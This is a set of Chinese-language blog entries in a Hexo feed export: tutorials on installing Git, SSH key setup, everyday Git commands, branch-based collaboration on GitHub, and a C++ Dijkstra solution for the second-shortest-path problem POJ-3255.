<h3 id="在Linux上安装"><a href="#在Linux上安装" class="headerlink" title="在Linux上安装"></a>在Linux上安装</h3><p>以<code>centos 7</code>为例（当然有些版本的Linux会默认安装好Git，不过其版本可能比较旧），首先输入<code>git --version</code>，如果输出版本信息则说明安装好了，否则输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install -y git</span><br></pre></td></tr></table></figure>

<p>安装成功以后再输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>出现版本号即可。</p>
<p>当然了如果你能力比较强，也可以使用源码安装的方式。</p>
<h3 id="在Windows上面安装"><a href="#在Windows上面安装" class="headerlink" title="在Windows上面安装"></a>在Windows上面安装</h3><p>Windows平台上面安装比较简单，只需要到<a href>官网下载</a>页面上下载合适的版本即可，例如我下载的是”Standalone Installer”的<code>64bit</code>版本的。</p>
<p>获取二进制安装包后，双击并默认其设置，不断点击<code>Next</code>即可。</p>
<p>安装完毕鼠标右键鼠标，应该可以看得到菜单中出现关于<code>Git</code>的选项</p>
<p><img src="https://qiniu.yalexin.top/right.jpg" alt></p>
<p>点击”Git Bash Here”输入以下命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure>

<p>出现版本号即可（当然，使用<code>Windows</code>自带的命令提示符打开命令窗口输入上述命令也可）</p>
<p>为方便使用，本笔记以<code>Windows</code>版本展开，当然后面也会穿插一些<code>Linux</code>版本的使用。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git和远程仓库建立连接</title>
    <url>/2020/04/06/Git%E5%92%8C%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93%E5%BB%BA%E7%AB%8B%E8%BF%9E%E6%8E%A5/</url>
    <content><![CDATA[<p>今天因为一些不可抗力因素重装了系统，发现<code>git</code>环境丢失了，就不得不重新配置一下<code>git</code>，顺便把过程写下来吧。</p>
<h2 id="git下载安装"><a href="#git下载安装" class="headerlink" title="git下载安装"></a>git下载安装</h2><p>安装过程直接默认，一直<code>next</code>就可以了。<a id="more"></a></p>
<h2 id="代码托管平台账号注册"><a href="#代码托管平台账号注册" class="headerlink" title="代码托管平台账号注册"></a>代码托管平台账号注册</h2><p><code>git</code>下载安装期间到第三方代码托管平台注册账户，开启一个远程仓库，记住该远程仓库的链接。</p>
<p>以码云为例：</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586182061136.png" alt="仓库截图"></p>
<h2 id="设置用户名和邮箱"><a href="#设置用户名和邮箱" class="headerlink" title="设置用户名和邮箱"></a>设置用户名和邮箱</h2><p>在<code>cmd</code>命令行或者用安装<code>git</code>时自带的<code>Git bash</code>输入下面的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "根据自己喜好进行设置用户名" </span><br><span class="line">git config --global user.email "自己常用的邮箱"</span><br></pre></td></tr></table></figure>

<h2 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "这里换上你的邮箱"</span><br></pre></td></tr></table></figure>

<p>上面这条命令在<code>cmd</code>命令行下可能会失败，用安装<code>git</code>时自带的<code>Git bash</code>就可以成功了，然后按照提示按下三次回车。</p>
<p><img src="http://q78fmp2j4.bkt.clouddn.com/1586182931481.png" alt="密钥图片"></p>
<h2 id="第三方平台添加密钥"><a href="#第三方平台添加密钥" class="headerlink" title="第三方平台添加密钥"></a>第三方平台添加密钥</h2><p>将上述生成的<code>/c/Users/YaleXin/.ssh/id_rsa.pub</code>文件中的内容复制，打开码云，在设置 –&gt;SSH公钥处粘贴所复制的内容。</p>
<h2 id="初始化本地仓库"><a href="#初始化本地仓库" class="headerlink" title="初始化本地仓库"></a>初始化本地仓库</h2><p>在需要的地方地方打开<code>Git bash</code>，输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>



<h2 id="将本地修改提交到远程仓库"><a href="#将本地修改提交到远程仓库" class="headerlink" title="将本地修改提交到远程仓库"></a>将本地修改提交到远程仓库</h2><p>随便修改一个文件，如新建一个<code>test.txt</code>，然后在<code>Git bash</code>输入下面的命令：</p>
<p>暂存更改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br></pre></td></tr></table></figure>

<p>提交更改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit -m "你的提交备注"</span><br></pre></td></tr></table></figure>

<p>连接远程仓库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin 你的远程仓库地址</span><br></pre></td></tr></table></figure>

<p>可以使用<code>HTTPS</code>或者<code>SSH</code>的方式。</p>
<p>从远程仓库拉取（若远程仓库没有任何数据，可以跳过这个步骤，否则输入：）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git pull</span><br></pre></td></tr></table></figure>

<p>推送到远端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>

<p>上面的命令是第一次提交的时候使用的命令，假如是非第一次，直接使用<code>git push</code>即可</p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Dijkstra算法实现次短路</title>
    <url>/2020/12/06/Dijkstra%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%AC%A1%E7%9F%AD%E8%B7%AF/</url>
    <content><![CDATA[<p>Dijkstra可以用于求解最短路问题，实际上该算法也可以实现次短路，更一般的，该算法可以实现第k短路</p>
<h2 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h2><p>题目：<a href="http://poj.org/problem?id=3255" target="_blank" rel="noopener">POJ-3255</a></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><a id="more"></a>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">5001</span>, INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="comment">// 分别存放0号节点到该节点的最短距离、次短距离</span></span><br><span class="line"><span class="keyword">int</span> dist1[MAX_N], dist2[MAX_N];</span><br><span class="line"><span class="keyword">int</span> n, r;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> adj, cost;</span><br><span class="line">    Edge(<span class="keyword">int</span> adj, <span class="keyword">int</span> cost) &#123;<span class="keyword">this</span>-&gt;adj = adj, <span class="keyword">this</span> -&gt; cost = cost;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 第一个代表距离、第二个代表后继节点</span></span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="built_in">vector</span>&lt;Edge&gt; nodeEdges[MAX_N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addEdge</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> v, <span class="keyword">int</span> cost)</span> </span>&#123;</span><br><span class="line">    nodeEdges[u].push_back(Edge(v, cost));</span><br><span class="line">    nodeEdges[v].push_back(Edge(u, cost));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Dijkstra 思想</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="comment">// 距离小的P优先级高</span></span><br><span class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; myQueue; </span><br><span class="line">    <span class="built_in">fill</span>(dist1, dist1 + n, INF);</span><br><span class="line">    <span class="built_in">fill</span>(dist2, dist2 + n, INF);</span><br><span class="line">    dist1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    myQueue.push(P(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty()) &#123;</span><br><span class="line">        P top = myQueue.top();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        <span class="keyword">int</span> adjNode = top.second, dist = top.first;</span><br><span class="line">        <span class="keyword">if</span> (dist2[adjNode] &lt; dist)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nodeEdges[adjNode].<span class="built_in">size</span>();i++) &#123;</span><br><span class="line">            Edge edge = nodeEdges[adjNode][i];</span><br><span class="line">            <span class="keyword">int</span> toNodeDist = dist + edge.cost;</span><br><span class="line">            <span class="comment">// 更新最短距离</span></span><br><span class="line">            <span class="keyword">if</span> (toNodeDist &lt; dist1[edge.adj]) &#123;</span><br><span class="line">                swap(dist1[edge.adj], toNodeDist);</span><br><span class="line">                myQueue.push(P(dist1[edge.adj], edge.adj));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 更新次短距离</span></span><br><span class="line">            <span class="keyword">if</span> (dist2[edge.adj] &gt; toNodeDist &amp;&amp; dist1[edge.adj] &lt; toNodeDist) &#123;</span><br><span class="line">                dist2[edge.adj] = toNodeDist;</span><br><span class="line">                myQueue.push(P(dist2[edge.adj], edge.adj));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,dist2[n - <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;n, &amp;r);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; r; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        addEdge(u - <span class="number">1</span>, v - <span class="number">1</span>, w);</span><br><span class="line">    &#125;</span><br><span class="line">    solve();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>最短路</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之Git基本操作</title>
    <url>/2022/02/08/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BGit%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>书接上回，本文主要介绍<code>Git</code>的简单日常操作。</p>
<h2 id="创建本地仓库"><a href="#创建本地仓库" class="headerlink" title="创建本地仓库"></a>创建本地仓库</h2><p>在此之前，我们先配置以下我们的账户信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.name <span class="string">"Your Name"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git config --global user.email <span class="string">"Your Email"</span></span></span><br></pre></td></tr></table></figure>

<p>这是因为<code>Git</code>是一个分布式版本控制软件，每次的提交都需要记下提交者的信息。</p>
<a id="more"></a>

<p><code>--global</code>意思是配置的是全局用户，这样子我们就不需要每个仓库都配置用户信息了。</p>
<p>例如我的信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name "YaleXin"</span><br><span class="line">git config --global user.email "495592364@qq.com"</span><br></pre></td></tr></table></figure>

<p>然后我们首先需要一个本地仓库，在电脑合适处新建个文件夹，例如<code>demoRepository</code>，然后进入该文件夹，右键鼠标打开<code>Git Bash</code>，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>

<p>然后该目录下就会生成一个以<code>.git</code>的隐藏文件夹，就代表着我们的本地仓库创建好了。</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p> <code>Git</code>常用的是以下 6 个命令：<code>git clone</code>、<code>git push</code>、<code>git add</code> 、<code>git commit</code>、<code>git checkout</code>、<code>git pull</code> </p>
<p>这几个命令作用如下图所示</p>
<p><img src="https://qiniu.yalexin.top/area.png" alt></p>
<p><strong>名词解释</strong></p>
<ul>
<li><code>workspace</code>：工作区</li>
<li><code>staging area</code>：暂存区/缓存区</li>
<li><code>local repository</code>：版本库或本地仓库</li>
<li><code>remote repository</code>：远程仓库</li>
</ul>
<p>暂存区工作区后面我们会更加详细介绍</p>
<h3 id="将文件加到仓库中"><a href="#将文件加到仓库中" class="headerlink" title="将文件加到仓库中"></a>将文件加到仓库中</h3><p>在我们的<code>demoRepository</code>文件夹下新建一个<code>README.md</code>文件（实际上如果你要使用<code>Git</code>管理我们的文件，则需要将文件放在仓库的目录下），然后在里边写入一些内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V1: This is a file!</span><br></pre></td></tr></table></figure>

<p>然后将该修改放到暂存区，即</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add README.md</span><br></pre></td></tr></table></figure>

<p>执行上面的命令，没有任何显示</p>
<p>然后使用<code>commit</code>命令将其加至仓库中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git commit -m "first commit"</span><br><span class="line">[master (root-commit) bbe2a77] first commit</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>

<p><code>-m</code> 参数是加入本次提交的说明备注，最好是带有一定目的性，否则后面很多提交后你就忘记本次提交的目的了。</p>
<p>上面的回显表明有一个文件有改动，有一行插入。</p>
<p>其他一些常用命令大全</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>git init</td>
<td>初始化本地仓库</td>
<td>git clone</td>
<td>克隆仓库，即将远端仓库下载到本地</td>
</tr>
<tr>
<td>git status</td>
<td>查看仓库当前的状态</td>
<td>git diff</td>
<td>比较暂存区和工作区的差异。</td>
</tr>
<tr>
<td>git add</td>
<td>添加文件到暂存区</td>
<td>git commit</td>
<td>提交暂存区到本地仓库</td>
</tr>
<tr>
<td>git reset</td>
<td>回退版本</td>
<td>git rm</td>
<td>删除工作区文件</td>
</tr>
<tr>
<td>git mv</td>
<td>移动或重命名工作区文件</td>
<td>git log</td>
<td>查看历史提交记录</td>
</tr>
<tr>
<td>git blame</td>
<td>以列表形式查看指定文件的历史修改记录</td>
<td>git remote</td>
<td>远程仓库操作</td>
</tr>
<tr>
<td>git fetch</td>
<td>从远程获取代码库</td>
<td>git pull</td>
<td>下载远程代码并合并</td>
</tr>
<tr>
<td>git push</td>
<td>上传远程代码并合并</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="版本控制"><a href="#版本控制" class="headerlink" title="版本控制"></a>版本控制</h2><p>上面是一个将文件加入到仓库中简单的步骤，下面我们进行更加详细的步骤</p>
<p>我们再在<code>README.md</code>文件中加入新内容(增加一行)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V2：This is the second write</span><br></pre></td></tr></table></figure>

<p>输入命令<code>git staatus</code>查看当前仓库状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git restore &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line">        modified:   README.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br></pre></td></tr></table></figure>

<p>大概意思是说有个文件修改过了。当然我们也可以使用<code>diff</code>命令查看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git diff README.md</span><br><span class="line">diff --git a/README.md b/README.md</span><br><span class="line">index 28b620b..48f320f 100644</span><br><span class="line">--- a/README.md</span><br><span class="line">+++ b/README.md</span><br><span class="line">@@ -1 +1,3 @@</span><br><span class="line">-V1: This is a file!</span><br><span class="line">\ No newline at end of file</span><br><span class="line">+V1: This is a file!</span><br><span class="line">+</span><br><span class="line">+V2：This is the second write</span><br><span class="line">\ No newline at end of file</span><br></pre></td></tr></table></figure>

<p>该命令可以更加清晰地知道改动了哪里。</p>
<p>然后我们将它们加到仓库中。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git add .</span><br><span class="line"></span><br><span class="line">E:\MyBlog\demoRepository&gt;git commit -m "second commit"</span><br><span class="line">[master e54198e] second commit</span><br><span class="line"> 1 file changed, 3 insertions(+), 1 deletion(-)</span><br><span class="line"></span><br><span class="line">E:\MyBlog\demoRepository&gt;git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<h3 id="切换到指定版本"><a href="#切换到指定版本" class="headerlink" title="切换到指定版本"></a>切换到指定版本</h3><p>我突然发现，我的文件里边写错了个单词<code>write</code>，应该是<code>writing</code>，当然你可以直接从文件下手，直接修改源文件，可是现在是一个文件，当然知道要怎么改，有的时候我们可能需要的是返回到上一次副本状态，即我们的<code>V1</code>版本，则该如何？</p>
<p>我们可以借助<code>git log</code>命令查看提交记录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">E:\MyBlog\demoRepository&gt;git log</span><br><span class="line">commit e54198ebb4e69baf5ea92eb75546b1dede044c52 (HEAD -&gt; master)</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Tue Feb 8 20:07:55 2022 +0800</span><br><span class="line"></span><br><span class="line">    second commit</span><br><span class="line"></span><br><span class="line">commit bbe2a77f4df4b447e42b53c81f02eb2e07c8c774</span><br><span class="line">Author: YaleXin &lt;495592364@qq.com&gt;</span><br><span class="line">Date:   Tue Feb 8 18:20:39 2022 +0800</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure>

<p>可以看到每一次的<code>commit</code>都对应一个哈希值。我们还发现最新的版本旁边还加了一个<code>HEAD</code>,表明这个是当前版本，上一个版本是<code>HEAD^</code>，上上个版本是<code>HEAD^^</code>，往上91个版本呢，总不可能91个<code>^</code>吧，<code>Git</code>早就为你想好啦！用<code>HEAD~91</code>即可。</p>
<p>我们使用<code>reset</code>命令即可实现去到某个版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard HEAD^</span></span><br><span class="line">HEAD is now at bbe2a77 first commit</span><br></pre></td></tr></table></figure>

<p>现在打开我们的<code>README.md</code>文件，文件内容果然变成了之前的版本，理论上说，只要我们记得每一次<code>commit</code>对应的哈希值，我们就可以在任意版本之间转换，例如，我们之前第二次的版本是<code>second commit</code>，对应的哈希值是<code>e54198ebb4e69baf5ea92eb75546b1dede044c52</code></p>
<blockquote>
<p>不过需要注意的是，版本回退以后，比当前版本“新”的提交记录是无法看得到的，即此时如果使用<code>git log</code>命令时我们会发现只有第一次的提交记录了</p>
</blockquote>
<p>我们继续使用<code>reset</code>命令进行版本切换，例如切换到第二次提交状态：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git reset --hard e54198ebb4e69baf5ea92eb75546b1dede044c52</span></span><br><span class="line">HEAD is now at e54198e second commit</span><br></pre></td></tr></table></figure>

<p>现在打开我们的<code>README.md</code>文件，文件内容果然变回了两行内容。</p>
<p><strong>我突然发现我想回退版本不就是为了改单词吗，可是怎么又跳回来了？？算了算了，直接修改文件吧，又不是不能！</strong></p>
<p>将第二行改成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">V3：This is the third writing</span><br></pre></td></tr></table></figure>

<p>顺便把修改后的文件加到仓库中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m "3"</span><br></pre></td></tr></table></figure>

<p><code>add .</code>是将当前文件夹下的修改都加 到暂存区。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>学习</tag>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title>Git学习笔记之多人协作</title>
    <url>/2022/02/10/Git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%A4%9A%E4%BA%BA%E5%8D%8F%E4%BD%9C/</url>
    <content><![CDATA[<p>书接上回，本文介绍利用<code>Git</code>进行多人协作。</p>
<a id="more"></a>

<p>我们都知道，<code>Git</code>是一个分布式版本控制管理软件，何为分布式？简单来说代码仓库在多台主机上都有备份，任意一台挂了也不至于代码丢失（当然所有关联了该仓库的主机都挂了的时候另当别论）。</p>
<p>我们所说的多人协作就是每个人在自己的电脑上都有中央仓库代码的一份备份代码，适当之时将我们的代码推送至中央仓库或者拉取别人写的代码下来，这时候就需要一台电脑充当服务器，在上面运行我们的<code>Git</code>程序，但是我们就像简简单单使用一下<code>Git</code>，并不想搭建服务器，可以吗？</p>
<p>答案是肯定的，有不少企业都推出了第三方代码托管平台，最出名的怕不是<a href="https://github.com/" target="_blank" rel="noopener"><code>Github</code></a>了，不过有一些特殊原因，该网站可能不稳定，建议配合国内的托管平台使用，国内比较知名的有<a href="https://gitee.com/" target="_blank" rel="noopener"><code>Gitee</code></a>、<a href="https://coding.net/" target="_blank" rel="noopener"><code>CODING</code></a>，另外，<code>github</code>默认所有仓库都是公开的，要想建立私有的仓库还是要充值，不过要是有教育邮箱可以优惠，该网站的用户也比较多，上面的项目质量也更好。</p>
<h2 id="远程仓库的使用"><a href="#远程仓库的使用" class="headerlink" title="远程仓库的使用"></a>远程仓库的使用</h2><p>为了方便演示多人协作，以使用<code>github</code>为例，本人使用的笔记本和服务器作为两个用户连接到<code>github</code>上面的仓库。</p>
<h3 id="创建GitHub账户并新建一个空仓库"><a href="#创建GitHub账户并新建一个空仓库" class="headerlink" title="创建GitHub账户并新建一个空仓库"></a>创建GitHub账户并新建一个空仓库</h3><p>注册账号就不用多说了吧。</p>
<p>然后点击右上角的加号，点击”new repository”，输入名字“cooperation”，然后点击“Create repository”。</p>
<h3 id="关联SSH-Key-到GitHub"><a href="#关联SSH-Key-到GitHub" class="headerlink" title="关联SSH Key 到GitHub"></a>关联SSH Key 到GitHub</h3><p>在Windows系统上面，首先创建<code>SSH Key</code>，打开命令提示符窗口或者<code>Git bash</code></p>
<p>输入以下命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "495592364@qq.com"</span><br></pre></td></tr></table></figure>

<p>然后按下三次回车即可生成。</p>
<p><img src="https://qiniu.yalexin.top/cooperation1.jpg" alt></p>
<p>记得把邮箱换成你的，然后打开<code>C:\Users\YaleXin\.ssh</code>，即你的用户名下的<code>.ssh</code>文件夹， 里边有<code>id_rsa</code>和<code>id_rsa.pub</code>这两个文件 ， 这两个就是<code>SSH Key</code>的秘钥对，<code>id_rsa</code>是私钥，千万不能泄露出去，<code>id_rsa.pub</code>是公钥，可以放心地告诉任何人。</p>
<p>然后打开<code>id_rsa.pub</code>，将里边的内容复制，接着打开<code>GitHub</code>网站，依次点击你的头像，“setting”，“SSH and GPG keys”，然后将刚刚复制的内容“ Key ”中，起一个好一点的“title”。</p>
<p>这样子<code>Windows</code>系统以后就可以关联<code>GitHub</code>了。</p>
<p>同样的方法在服务器上面再次操作</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C "me@yalexin.top"</span><br></pre></td></tr></table></figure>

<p>然后注意公钥生成的位置即可。</p>
<p>然后将公钥内容加到<code>GitHub</code>。</p>
<h3 id="本地仓库关联GitHub仓库"><a href="#本地仓库关联GitHub仓库" class="headerlink" title="本地仓库关联GitHub仓库"></a>本地仓库关联GitHub仓库</h3><p>Windows系统上面，打开命令提示符窗口或者<code>Git bash</code>，初始化本地仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mkdir cooperation</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> cooperation</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git init</span></span><br><span class="line">Initialized empty Git repository in E:/MyBlog/cooperation/.git/</span><br></pre></td></tr></table></figure>

<p>然后开始干活啦，主分支添加<code>readme</code>文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> touch README.md</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"创建仓库"</span></span></span><br><span class="line">[master (root-commit) 3469c3f] 创建仓库</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 README.md</span><br></pre></td></tr></table></figure>

<p>关联远程仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote add origin https://github.com/YaleXin/cooperation.git</span><br></pre></td></tr></table></figure>

<p><code>https://github.com/YaleXin/cooperation.git</code>这个地址在<code>GitHub</code>仓库界面获得。</p>
<p>添加后，远程仓库的名字就是<code>origin</code>，当然了，这是<code>Git</code>默认的叫法，你要是喜欢也可以改成别的，但是最好见名思意，<code>origin</code>这个名字一看就知道是远程库。</p>
<p>下一步，就可以把本地库的所有内容推送到远程库上：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin master</span></span><br></pre></td></tr></table></figure>

<p>由于这是我们第一次向远端仓库推送，即远端仓库还没有该分支，因此需要加上<code>-u</code>参数，下次需要推送该分支的时候直接<code>git push</code>即可。</p>
<p>创建本人的分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch -c dev</span></span><br><span class="line">Switched to a new branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git switch -c Axin</span></span><br><span class="line">Switched to a new branch 'Axin'</span><br><span class="line"><span class="meta">$</span><span class="bash"> touch xin.data</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git add .</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"添加用户信息"</span></span></span><br><span class="line">[Axin 64f3345] 添加用户信息</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 xin.data</span><br></pre></td></tr></table></figure>

<p>合并到<code>dev</code>分支</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch dev</span></span><br><span class="line">Switched to branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git merge Axin --no-ff -m <span class="string">"阿信完成用户信息"</span></span></span><br><span class="line">Merge made by the 'ort' strategy.</span><br><span class="line"> xin.data | 0</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 xin.data</span><br></pre></td></tr></table></figure>

<p>将<code>dev</code>分支推送到远端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git switch dev</span></span><br><span class="line">Switched to branch 'dev'</span><br><span class="line"><span class="meta">$</span><span class="bash"> git push -u origin dev</span></span><br></pre></td></tr></table></figure>

<p>实际情况中，<code>master</code>分支是主分支，因此要时刻与远程同步，<code>dev</code>分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步，<code>bug</code>分支只用于在本地修复<code>bug</code>，就没必要推到远程了，除非老板要看看你每周到底修复了几个<code>bug</code>，或者说你修复<code>bug</code>也作为效绩的一部分，哈哈哈哈哈哈；<code>feature</code>分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。</p>
<p>然后在<code>Linux</code>上面的用户只需要克隆该仓库既可以看到这边的提交了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/YaleXin/cooperation.git</span></span><br></pre></td></tr></table></figure>

<p>不过默认情况下只会拉取远端仓库的<code>master</code>分支</p>
<p>如果需要拉取<code>dev</code>分支，则需要</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> git branch dev origin/dev</span></span><br></pre></td></tr></table></figure>

<p>即新建一个<code>dev</code>分支关联至远端仓库的<code>dev</code>分支。</p>
